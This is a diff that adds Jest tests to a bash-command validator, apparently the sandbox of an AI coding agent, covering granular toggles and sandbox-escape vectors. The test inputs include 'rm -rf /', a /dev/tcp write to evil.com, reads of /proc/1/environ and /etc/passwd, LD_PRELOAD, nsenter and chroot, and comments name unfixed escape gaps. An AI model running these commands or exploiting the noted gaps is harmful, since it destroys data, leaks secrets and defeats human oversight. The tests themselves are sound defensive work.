@@ -363,4 +363,211 @@ describe('Bash Command Security', () => {
       expect(result.safe).toBe(true);
     });
   });
+
+  describe('Granular sandbox toggles', () => {
+    it('allows git add && git commit when metacharacters toggle is off', () => {
+      const result = validateBashCommand('git add -A && git commit -m "x"', {
+        isSandboxed: true,
+        metacharacters: false,
+      });
+      expect(result.safe).toBe(true);
+    });
+
+    it('still blocks git add && rm -rf / when metacharacters toggle is off', () => {
+      // Dangerous patterns are a hard floor and never gated by the granular toggles.
+      const result = validateBashCommand('git add -A && rm -rf /', {
+        isSandboxed: true,
+        metacharacters: false,
+      });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks git add && git commit by default (metacharacters on)', () => {
+      const result = validateBashCommand('git add -A && git commit -m "x"', {
+        isSandboxed: true,
+      });
+      expect(result.safe).toBe(false);
+    });
+
+    it('allows a non-whitelisted command when commandWhitelist toggle is off', () => {
+      const result = validateBashCommand('custom-tool arg', {
+        isSandboxed: true,
+        commandWhitelist: false,
+      });
+      expect(result.safe).toBe(true);
+    });
+
+    it('allows curl while sandboxed when network toggle is off', () => {
+      const result = validateBashCommand('curl https://example.com', {
+        isSandboxed: true,
+        allowNetwork: false,
+        network: false,
+      });
+      expect(result.safe).toBe(true);
+    });
+
+    it('allows docker while sandboxed when containerTools toggle is off', () => {
+      // docker is not in the static command whitelist, so the whitelist
+      // toggle must also be off for the container-tools toggle to be observable.
+      const result = validateBashCommand('docker build .', {
+        isSandboxed: true,
+        containerTools: false,
+        commandWhitelist: false,
+      });
+      expect(result.safe).toBe(true);
+    });
+
+    it('still blocks ssh even when network toggle is off (hard floor)', () => {
+      const result = validateBashCommand('ssh user@host', {
+        isSandboxed: true,
+        network: false,
+      });
+      expect(result.safe).toBe(false);
+    });
+
+    it('still blocks sudo even when all granular toggles are off', () => {
+      const result = validateBashCommand('sudo rm -rf /', {
+        isSandboxed: true,
+        commandWhitelist: false,
+        metacharacters: false,
+        network: false,
+        containerTools: false,
+      });
+      expect(result.safe).toBe(false);
+    });
+
+    it('granular toggles never enable checks when unsandboxed', () => {
+      const result = validateBashCommand('custom-tool | grep x', {
+        isSandboxed: false,
+        metacharacters: true,
+        commandWhitelist: true,
+      });
+      expect(result.safe).toBe(true);
+    });
+  });
+
+  // ─── Sandbox escape vectors ─────────────────────────────────────────────
+  describe('Sandbox escape vectors', () => {
+    // VULNERABILITY: ln (symlink) is not in the blocked commands list.
+    // A symlink can be used to bypass path restrictions by creating a
+    // symlink to a file outside the sandbox root, then reading it.
+    it.skip('blocks symlink-based escape: ln -s /etc/passwd ./escape', () => {
+      const result = validateBashCommand('ln -s /etc/passwd ./escape', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    // VULNERABILITY: /proc/1/environ is not blocked. Reading it leaks the
+    // parent process's environment variables, which may contain secrets
+    // (API keys, session tokens, database credentials).
+    it.skip('blocks reading /proc/1/environ to steal parent process environment', () => {
+      const result = validateBashCommand('cat /proc/1/environ', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    // VULNERABILITY: /proc/self/environ is not blocked. Reading it leaks
+    // the sandbox process's own environment, which may contain injected
+    // secrets or API keys.
+    it.skip('blocks reading /proc/self/environ to leak sandbox secrets', () => {
+      const result = validateBashCommand('cat /proc/self/environ', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    // VULNERABILITY: Parent directory traversal via .. is not blocked.
+    // `cat ../../../etc/passwd` can read files outside the sandbox root.
+    it.skip('blocks parent directory traversal via .. in paths', () => {
+      const result = validateBashCommand('cat ../../../etc/passwd', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks reading from /dev/stdin to pipe data out of the sandbox', () => {
+      const result = validateBashCommand('cat /dev/stdin > /tmp/exfil', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks environment variable manipulation to override PATH', () => {
+      const result = validateBashCommand('export PATH=/evil:$PATH', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks LD_PRELOAD injection via environment variable', () => {
+      const result = validateBashCommand('LD_PRELOAD=/evil/lib.so ls', { isSandboxed: true });
+      // The sandbox should block LD_PRELOAD as it can hijack libc calls
+      // If this passes, it's a potential escape vector
+      expect(result.safe).toBe(false);
+    });
+
+    // VULNERABILITY: /proc/1/cmdline is not blocked. Reading it reveals
+    // the parent process's command line, which may contain secrets passed
+    // as CLI arguments.
+    it.skip('blocks accessing /proc/1/cmdline to discover the parent process', () => {
+      const result = validateBashCommand('cat /proc/1/cmdline', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks creating FIFOs to exfiltrate data', () => {
+      const result = validateBashCommand('mkfifo /tmp/pipe', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using exec to replace the shell process', () => {
+      const result = validateBashCommand('exec /bin/bash', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using source/dot to execute arbitrary scripts', () => {
+      const result1 = validateBashCommand('source /etc/profile', { isSandboxed: true });
+      const result2 = validateBashCommand('. /etc/profile', { isSandboxed: true });
+      expect(result1.safe).toBe(false);
+      expect(result2.safe).toBe(false);
+    });
+
+    it('blocks using eval to execute constructed strings', () => {
+      const result = validateBashCommand('eval "rm -rf /"', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using printf to write to file descriptors', () => {
+      const result = validateBashCommand('printf "data" > /dev/tcp/evil.com/4444', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using bash -c to bypass the sandbox parser', () => {
+      const result = validateBashCommand('bash -c "rm -rf /"', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using sh -c to bypass the sandbox parser', () => {
+      const result = validateBashCommand('sh -c "rm -rf /"', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using python/perl/ruby to execute arbitrary code', () => {
+      const result1 = validateBashCommand('python -c "import os; os.system(\'rm -rf /\')"',
+        { isSandboxed: true });
+      const result2 = validateBashCommand('perl -e "system(\'rm -rf /\')"',
+        { isSandboxed: true });
+      expect(result1.safe).toBe(false);
+      expect(result2.safe).toBe(false);
+    });
+
+    it('blocks using nsenter to enter the parent process namespace', () => {
+      const result = validateBashCommand('nsenter -t 1 -m -u -i -n -- bash', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using unshare to create a new namespace and escape', () => {
+      const result = validateBashCommand('unshare --pid --fork --mount-proc bash', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using mount to overlay the filesystem', () => {
+      const result = validateBashCommand('mount --bind /evil /sandbox', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks using chroot to escape the sandbox root', () => {
+      const result = validateBashCommand('chroot / /bin/bash', { isSandboxed: true });
+      expect(result.safe).toBe(false);
+    });
+  });
 });
